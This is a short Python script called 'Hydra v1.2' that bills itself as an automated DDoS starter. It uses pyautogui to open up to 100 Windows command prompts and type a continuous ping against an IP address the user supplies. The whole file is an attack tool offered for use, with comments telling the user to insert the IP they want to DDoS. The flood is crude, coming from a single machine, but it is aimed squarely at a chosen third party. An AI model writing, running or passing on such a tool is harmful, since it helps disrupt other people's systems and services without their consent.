# Hydra v1.2
# A fully automated DDOS starter for Python


import pyautogui     # Make sure you have me! If not, do pip install pyautogui
import time     


IP_TO_DDOS = "0.0.0.0"     # Replace me with the IP you want to DDOS
CMDS_TO_OPEN = 100    # Replace me with the amount of CMDs to open.


commandString = str("ping " + IP_TO_DDOS + " -t")


for i in range(CMDS_TO_OPEN):
    
    pyautogui.hotkey("winleft", "r")
        
    pyautogui.press("C")
    pyautogui.press("M")
    pyautogui.press("D")
    pyautogui.press("enter")
    time.sleep(1)
    
    pyautogui.typewrite(commandString)
    pyautogui.press("enter")



